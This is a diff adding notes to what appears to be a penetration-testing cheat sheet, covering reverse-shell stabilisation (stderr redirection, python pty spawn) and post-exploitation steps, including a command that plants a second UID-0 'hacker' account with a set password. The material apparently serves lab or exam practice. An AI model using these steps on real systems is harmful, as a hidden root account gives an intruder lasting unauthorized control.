@@ -936,6 +936,51 @@ up.
 
 Get bash like prompt and usability on a NetCat reverse shell on Linux
 
+STDERR Redirect. Error messages will not be sent the the reverse shell unless you use
+redirection.  For both Linux and Windows the syntax is `COMMAND 2>&1`
+
+```bash
+ls -al /usr/bin/ 2>&1
+```
+
+```dos
+dir c:\ /b /s | find "proof.txt" 2>&1
+```
+
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+## Usefull Linux Commands
+
+Add a user with root privilages
+```bash
+sudo useradd -g root -u 0 -o -s /bin/bash hacker
+```
+* -g sets the groop
+* -u sets the user ID
+* -o Allows for non unique User ID
+* -s selects bash as the default shell
+* hacker is the user name
+
+next set the new user password with:
+```bash
+sudo passwd hacker
+```
+or
+```bash
+echo "usrname:pass" | chpasswd
+```
+
+Change user from the command line
+```bash
+su - username
+```
+Will need the users password and if no user is specified then `root` will be the selected
+user.
+
+If you get the error 'xterm-256color': unknown terminal type.
+```bash
+export TERM=xterm
+```
+
